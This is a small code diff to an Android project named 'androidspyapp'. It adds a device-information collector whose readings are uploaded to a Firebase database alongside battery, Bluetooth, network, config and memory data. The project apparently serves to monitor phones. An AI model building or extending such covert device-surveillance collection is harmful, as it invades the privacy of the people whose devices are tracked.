@@ -1,5 +1,6 @@
 package com.komnacki.androidspyapp
 
+import android.app.Activity
 import android.content.Context
 import android.util.Log
 import com.google.android.gms.tasks.OnCompleteListener
@@ -8,6 +9,7 @@ import com.google.firebase.database.*
 import com.komnacki.androidspyapp.device.battery.BatteryState
 import com.komnacki.androidspyapp.device.bluetooth.BluetoothState
 import com.komnacki.androidspyapp.device.config.ConfigState
+import com.komnacki.androidspyapp.device.device.DeviceState
 import com.komnacki.androidspyapp.device.memory.MemoryState
 import com.komnacki.androidspyapp.device.network.NetworkState
 import github.nisrulz.easydeviceinfo.base.EasyConfigMod
@@ -20,6 +22,7 @@ class MessageUtils {
     private val CONFIG_DATABASE_TAG = "CONFIG"
     private val NETWORK_DATABASE_TAG = "NETWORK"
     private val MEMORY_DATABASE_TAG = "MEMORY"
+    private val DEVICE_DATABASE_TAG = "DEVICE"
 
     companion object {
         lateinit var userEmail: String
@@ -47,6 +50,7 @@ class MessageUtils {
         val configState = ConfigState(context)
         val networkState = NetworkState(context)
         val memoryState = MemoryState(context)
+        val deviceState = DeviceState(context)
 
         val values = mutableMapOf<String, Any>()
         batteryState.getData().forEach { item ->
@@ -64,6 +68,9 @@ class MessageUtils {
         }
         memoryState.getData().forEach{ item ->
             values[MEMORY_DATABASE_TAG + "/" + item.key] = item.value
+        }
+        deviceState.getData().forEach{ item ->
+            values[DEVICE_DATABASE_TAG + "/" + item.key] = item.value
         }
         getBaseHeader().updateChildren(values).addOnCompleteListener(object : OnCompleteListener<Void> {
             override fun onComplete(p0: Task<Void>) {
